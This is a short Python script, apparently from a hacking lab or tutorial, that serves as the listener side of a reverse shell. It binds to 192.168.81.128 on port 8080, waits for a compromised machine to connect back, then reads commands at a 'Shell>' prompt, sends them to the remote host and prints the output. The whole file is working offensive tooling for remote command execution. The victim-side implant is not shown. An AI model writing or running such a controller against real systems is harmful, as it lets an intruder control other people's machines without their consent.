import socket

def connect():
    Mysocket = socket.socket()
    Mysocket.bind(("192.168.81.128", 8080))
    Mysocket.listen(1)
    print("[+] Listening for income TCP connection on port 8080")
    connection, address = Mysocket.accept()
    print("We got a connection from", address)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break

        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())


def main():
    connect()

main()
